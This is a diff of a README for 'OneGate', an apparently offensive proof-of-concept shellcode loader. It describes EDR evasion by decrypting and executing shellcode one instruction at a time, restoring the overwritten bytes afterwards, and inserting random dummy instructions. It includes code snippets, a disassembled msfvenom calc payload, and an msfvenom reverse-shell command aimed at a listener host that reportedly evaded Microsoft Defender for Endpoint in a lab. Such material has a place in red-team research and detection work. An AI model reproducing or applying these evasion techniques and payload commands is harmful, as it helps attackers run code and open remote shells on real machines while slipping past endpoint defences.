@@ -39,7 +39,7 @@ A sample output of the constructor is as follows:
 
 OneGate first allocates a memory page and fills it with random instructions. It randomly allocates a starting position for the shellcode within this memory page so that the shellcode doesn't start in the same place each time.
 
-It then opens the file that is being used to perform the byte deobfuscation and iterates through `Postitions[]` and only decrptys the number of bytes needed for that particular instruction. This way only the exact bytes required for the next instruction are ever revealed at any given time. These bytes are written to their correct plce in the memory page (overwriting what is already there) and executed. Once an instruction is executed the original bytes that were overwritten are written back to their place in the memory page. Therefore not only are the bytes only exposed for the minimum amount of time, but unless the defence system can catch the modification in time, it will appear as though nothing changed on the memory page at that particular address.
+It then opens the file that is being used to perform the byte deobfuscation and iterates through `Postitions[]` and only decrptys the number of bytes needed for that particular instruction. This way only the exact bytes required for the next instruction are ever revealed at any given time. These bytes are written to their correct plce in the memory page (overwriting what is already there) and executed using single setpping. Once an instruction is executed the original bytes that were overwritten are written back to their place in the memory page. Therefore not only are the bytes only exposed for the minimum amount of time, but unless the defence system can catch the modification in time, it will appear as though nothing changed on the memory page at that particular address.
 
 To defeat any register based pattern recognition which may be used by EDRs, at random intervals OneGate generates a random set of instructions and executes them - these are referred to as dummy instructions. A stable of instructions are held in the `instructions[][]` array. It will select a random number of instructions to use for each given dummy set, so that the dummy instructions are not always the same length. Before executing the dummy instructions, it saves the thread context of the shellcode execution. This enables the dummy instructions to modify them at will. The tread context is then restored and execution of the shellcode continues as if nothing happened.
 
@@ -47,10 +47,37 @@ Currently the `instructions[][]` array only takes instructions which are three b
 
 OneGate takes a **LOOOOONG** time to run payloads, so be patient after you launch it. On my VM with very little system resources it takes about 3 minutes to spawn a calculator and 20 minutes to get a reverse shell connection. In the lab environment (see Evasion) it took about 6 minutes to get a reverse shell.
 
+There are two `.c` files in the Executor project folder. One is an example with running calc.exe and the other is a reverse shell. You will need to set one as "Exclude From Project" otherwise it will not compile.
+
+#### Shortfall of deobfusaction technique
+
+One shortfall of this technique is that unless the RIP points to a particular instruction it will not be deobfuscated. For example the last few instructions of `msfvenom -p windows/x64/exec CMD=calc.exe` are:
+```
+106:    41 89 da                mov    r10d,ebx
+109:    ff d5                   call   rbp
+10b:    63 61 6c                movsxd esp,DWORD PTR [rcx+0x6c]
+10e:    63 00                   movsxd eax,DWORD PTR [rax] 
+```
+
+Ordinarly `call rbp` would trigger the two instructions after it (these spell out "calc" which tells it what to run), however as these are still obfuscated when `call rbp` is executed nothing happens. Therefore we need to unmask these instructions manually. At present it is done in a lazy way - it just reveals these instructions at all times. Two special arrays are created:
+```
+const unsigned char second_last[] = { 0x63, 0x61, 0x6c };
+const unsigned char last[] = { 0x63, 0x00 };
+```
+
+One the first run of the vectored exception handler it writes them to the allocated memory space:
+```
+memcpy((DWORD64)baseAddress + 0x10B, second_last, 3);
+memcpy((DWORD64)baseAddress + 0x10E, last, 2);
+```
+
+These are not overwritten as only instructions that are deobfuscated are overwritten again.
+
+A better way to handle this could be just in time deobfuscation, where there is a check to see if the RIP is at offset `109` and then have it deobfuscate 7 bytes as opposed to only 2. This has not been implemented here because as mentioned above this is a proof of concept.
 
 ## Evasion
 
-This was tested in Altered Security's lab environment (shout out to Nikhil for letting me test it on there) which had a machine running Microsoft Defender for Endpoint (Microsoft's EDR solution). OneGate was infiltrated to the target machine and run from disk without using any sort of in memory PE loading techniques. Using the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.91 LPORT=9000` built on `notepad.exe` a reverse connection was successfully established to the listener machine.
+This was tested in [Altered Security](https://www.alteredsecurity.com/)'s lab environment (shout out to Nikhil for letting me test it on there) which had a machine running Microsoft Defender for Endpoint (Microsoft's EDR solution). OneGate was infiltrated to the target machine and run from disk without using any sort of in memory PE loading techniques. Using the payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.91 LPORT=9000` built on `notepad.exe` a reverse connection was successfully established to the listener machine.
 
 [insert picture]
 
